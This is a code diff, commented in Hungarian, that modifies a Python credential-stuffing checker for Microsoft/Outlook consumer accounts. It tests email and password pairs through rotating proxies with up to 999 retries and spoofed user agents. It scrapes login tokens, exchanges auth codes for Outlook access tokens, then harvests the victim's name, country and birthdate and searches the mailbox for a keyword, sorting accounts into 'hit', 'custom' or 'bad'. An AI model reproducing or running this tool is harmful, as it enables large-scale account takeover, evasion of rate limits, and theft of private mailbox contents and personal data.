@@ -6,15 +6,14 @@ import time
 import random
 from proxy_manager import proxy_manager
 
-# Fix User-Agentek
+# Fix User-Agentek (mint az eredetiben user_agent package helyett)
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
 ]
 
-PROXY_RETRIES = 5
-DIRECT_FALLBACK = False
+PROXY_RETRIES = 999  # Gyakorlatilag végtelen, mint az eredetiben
 
 
 def generate_user_agent():
@@ -22,6 +21,13 @@ def generate_user_agent():
 
 
 def checker_worker_single(email: str, password: str, keyword: str):
+    """
+    Ugyanaz a logika mint az eredeti scriptben:
+    - Ha proxy hiba → retry (akár 999x is)
+    - Ha __Host-MSAAUTHP nincs → BAD
+    - Ha van access_token → profile + search
+    - Ha Total > 0 → HIT, különben CUSTOM
+    """
     if proxy_manager.get_count() > 0:
         for attempt in range(PROXY_RETRIES):
             proxy_dict = proxy_manager.get_proxy()
@@ -31,22 +37,30 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
             try:
                 result = _do_check(session, email, password, keyword)
+                # Az eredeti scriptben: hit, custom, bad a végleges eredmények
                 if result["status"] in ("hit", "custom", "bad"):
                     return result
             except Exception:
+                # Proxy hiba → következő proxyval próbálja (mint az eredetiben)
                 pass
             finally:
                 session.close()
 
-            time.sleep(0.1)
+            time.sleep(0.05)  # Kis késleltetés mint az eredetiben
 
+    # Ha nincs proxy vagy mind elfogyott
     return {"status": "error", "reason": "All proxies failed"}
 
 
 def _do_check(session, email, password, keyword):
+    """
+    UGYANAZ a logika mint az eredeti scriptben!
+    Nincs túlbonyolítás, nincs szigorú validáció.
+    """
     try:
         user_agent = generate_user_agent()
 
+        # ====== STEP 1: GET login page ======
         url = (
             "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
             f"client_info=1&haschrome=1&login_hint={email}"
@@ -59,7 +73,7 @@ def _do_check(session, email, password, keyword):
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
             "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "return-client-request-id": "false",
             "client-request-id": str(uuid.uuid4()),
             "x-ms-sso-ignore-sso": "1",
@@ -80,11 +94,7 @@ def _do_check(session, email, password, keyword):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
-        # LAZA ELLENŐRZÉS - csak alapvető Microsoft marker
-        if "PPFT" not in response_text or "urlPost" not in response_text:
-            return {"status": "error", "reason": "No PPFT/urlPost"}
-
-        # PPFT kinyerése
+        # ====== STEP 2: Parse PPFT & urlPost ======
         PPFT = ""
         urlPost = ""
 
@@ -97,11 +107,12 @@ def _do_check(session, email, password, keyword):
                 server_data = json.loads(server_data_json)
                 sFTTag = server_data.get('sFTTag', '')
                 if sFTTag:
-                    ppft_match = re.search(r'value="([^"]+)"', sFTTag)
+                    ppft_pattern = r'value="([^"]+)"'
+                    ppft_match = re.search(ppft_pattern, sFTTag)
                     if ppft_match:
                         PPFT = ppft_match.group(1)
                 urlPost = server_data.get('urlPost', '')
-            except:
+            except json.JSONDecodeError:
                 pass
 
         if not PPFT:
@@ -113,14 +124,16 @@ def _do_check(session, email, password, keyword):
                 PPFT = response_text[start_index:end_index] if end_index != -1 else ""
 
         if not urlPost:
-            urlpost_match = re.search(r'"urlPost":"([^"]+)"', response_text)
+            urlpost_pattern = r'"urlPost":"([^"]+)"'
+            urlpost_match = re.search(urlpost_pattern, response_text)
             if urlpost_match:
                 urlPost = urlpost_match.group(1)
 
+        # Ha nincs PPFT vagy urlPost → hiba (retry)
         if not PPFT or not urlPost:
             return {"status": "error", "reason": "No PPFT/urlPost"}
 
-        # POST
+        # ====== STEP 3: POST credentials ======
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -143,7 +156,7 @@ def _do_check(session, email, password, keyword):
         headers_post = {
             "User-Agent": user_agent,
             "Pragma": "no-cache",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "Host": "login.live.com",
             "Connection": "keep-alive",
             "Content-Length": str(len(data_string)),
@@ -168,27 +181,23 @@ def _do_check(session, email, password, keyword):
             allow_redirects=False, timeout=30
         )
 
-        post_text = post_response.text if post_response.text else ""
+        # ====== STEP 4: Check auth cookie ======
+        # EZ AZ EREDI LOGIKA: ha nincs __Host-MSAAUTHP → BAD
         cookies_dict = session.cookies.get_dict()
+        if "__Host-MSAAUTHP" not in cookies_dict:
+            return {"status": "bad", "reason": "Wrong password"}
 
-        # AUTH COOKIE ELLENŐRZÉS - LAZA
-        auth_cookie = cookies_dict.get("__Host-MSAAUTHP", "")
-
-        if not auth_cookie:
-            # Valódi hibaüzenet keresése
-            if "sErrTxt" in post_text or "incorrect" in post_text.lower() or "error" in post_text.lower():
-                return {"status": "bad", "reason": "Wrong password"}
-            else:
-                return {"status": "error", "reason": "No auth cookie"}
-
-        # Auth code kinyerése
+        # ====== STEP 5: Extract auth code ======
         auth_code = ""
+        post_text = post_response.text if post_response.text else ""
+
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
             if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
                 auth_code = redirect_url.split('code=')[1].split('&')[0]
         else:
-            redirect_match = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', post_text)
+            redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
+            redirect_match = re.search(redirect_pattern, post_text)
             if redirect_match:
                 redirect_url = redirect_match.group(1)
                 if 'msauth://' in redirect_url and 'code=' in redirect_url:
@@ -198,37 +207,35 @@ def _do_check(session, email, password, keyword):
         if CID:
             CID = CID.upper()
 
-        if not auth_code:
-            return {"status": "error", "reason": "No auth code"}
-
-        # Token kérés
+        # ====== STEP 6: Get access token ======
         access_token = ""
-        url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-        data_token = {
-            "client_info": "1",
-            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-            "grant_type": "authorization_code",
-            "code": auth_code,
-            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
-        }
+        if auth_code:
+            url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+            data_token = {
+                "client_info": "1",
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": auth_code,
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+            }
+            try:
+                token_response = requests.post(
+                    url_token, data=data_token,
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                    timeout=30
+                )
+                if token_response.status_code == 200:
+                    token_data = token_response.json()
+                    access_token = token_data.get("access_token", "")
+            except:
+                pass
 
-        try:
-            token_response = requests.post(
-                url_token, data=data_token,
-                headers={"Content-Type": "application/x-www-form-urlencoded"},
-                timeout=30
-            )
-            if token_response.status_code == 200:
-                token_data = token_response.json()
-                access_token = token_data.get("access_token", "")
-        except:
-            return {"status": "error", "reason": "Token request failed"}
+        # Ha nincs access_token vagy CID → bad (mint az eredetiben)
+        if not access_token or not CID:
+            return {"status": "bad", "reason": "No token"}
 
-        if not access_token:
-            return {"status": "error", "reason": "No access token"}
-
-        # Profile kérés
+        # ====== STEP 7: Profile ======
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -240,7 +247,7 @@ def _do_check(session, email, password, keyword):
             "Accept": "application/json",
             "ForceSync": "false",
             "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}" if CID else "",
+            "X-AnchorMailbox": f"CID:{CID}",
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip",
@@ -249,25 +256,24 @@ def _do_check(session, email, password, keyword):
         try:
             pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
             if pRes.status_code == 200:
-                try:
-                    profile_data = pRes.json()
-                    if "accounts" in profile_data and profile_data["accounts"]:
-                        first_account = profile_data["accounts"][0]
-                        Country = first_account.get("location", "")
-                        BD = first_account.get("birthDay", "")
-                        BM = first_account.get("birthMonth", "")
-                        BY = first_account.get("birthYear", "")
-                        if BD and BM and BY:
-                            Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
-                    if "names" in profile_data and profile_data["names"]:
-                        first_name = profile_data["names"][0]
-                        Name = first_name.get("displayName", "")
-                except:
-                    pass
+                profile_data = pRes.json()
+                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
+                    first_account = profile_data["accounts"][0]
+                    Country = first_account.get("location", "")
+                    BD = first_account.get("birthDay", "")
+                    BM = first_account.get("birthMonth", "")
+                    BY = first_account.get("birthYear", "")
+                    if BD and BM and BY:
+                        BD_str = str(BD).zfill(2)
+                        BM_str = str(BM).zfill(2)
+                        Birthdate = f"{BY}-{BM_str}-{BD_str}"
+                if "names" in profile_data and len(profile_data["names"]) > 0:
+                    first_name = profile_data["names"][0]
+                    Name = first_name.get("displayName", "")
         except:
             pass
 
-        # Email search
+        # ====== STEP 8: Email search ======
         Total = "NO"
         Date = "N/A"
 
@@ -322,7 +328,7 @@ def _do_check(session, email, password, keyword):
             "Accept": "application/json",
             "ForceSync": "false",
             "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}" if CID else "",
+            "X-AnchorMailbox": f"CID:{CID}",
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip",
@@ -342,9 +348,7 @@ def _do_check(session, email, password, keyword):
                 if date_start != -1:
                     date_start += len('"LastModifiedTime":"')
                     date_end = search_text.find('"', date_start)
-                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
-                    if raw_date != "N/A":
-                        Date = raw_date.replace("T", " ")[:16]
+                    Date = search_text[date_start:date_end] if date_end != -1 else "N/A"
 
                 total_start = search_text.find('"Total":')
                 if total_start != -1:
@@ -352,11 +356,12 @@ def _do_check(session, email, password, keyword):
                     total_end = search_text.find(',', total_start)
                     if total_end == -1:
                         total_end = search_text.find('}', total_start)
-                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
+                    Total = search_text[total_start:total_end] if total_end != -1 else "NO"
         except:
             pass
 
-        # EREDMÉNY
+        # ====== STEP 9: Return result ======
+        # UGYANAZ a logika mint az eredetiben!
         if Total != "0" and Total != "NO" and Total != "":
             return {
                 "status": "hit",
